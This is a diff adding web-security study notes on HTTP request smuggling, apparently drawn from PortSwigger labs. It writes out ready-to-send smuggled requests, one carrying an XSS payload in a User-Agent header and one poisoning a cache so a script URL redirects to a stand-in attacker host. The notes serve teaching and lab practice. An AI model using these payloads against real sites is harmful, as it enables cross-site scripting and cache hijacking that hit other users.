@@ -335,3 +335,54 @@ User-Agent: <script>alert(1)</script>
 Foo: X
 ```
 
+```
+POST / HTTP/1.1
+Host: 0ac600bb04c0b2b881c97592009e0090.web-security-academy.net
+Cookie: session=8iPXyddAkd8H2vIvtd6Sa2eawkj4b9A8
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 149
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=4 HTTP/1.1
+User-Agent: "/><script>alert(1)</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
+```
+
+## Using HTTP request smuggling to perform web cache poisoning <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>
+
+If any part of the front-end infrastructure performs caching of content (generally for performance reasons), then it might be possible to poison the cache with the off-site redirect response. This will make the attack persistent, affecting any user who subsequently requests the affected URL.
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 59
+Transfer-Encoding: chunked
+
+0
+
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: XGET /static/include.js HTTP/1.1
+Host: vulnerable-website.com
+```
+
+The smuggled request reaches the back-end server, which responds as before with the off-site redirect. The front-end server caches this response against what it believes is the URL in the second request, which is `/static/include.js`:
+
+```
+GET /static/include.js HTTP/1.1
+Host: vulnerable-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: https://attacker-website.com/home/
+```
+
+From this point onwards, when other users request this URL, they receive the redirection to the attacker's web site.
+
+#### Example
+
+[https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning)
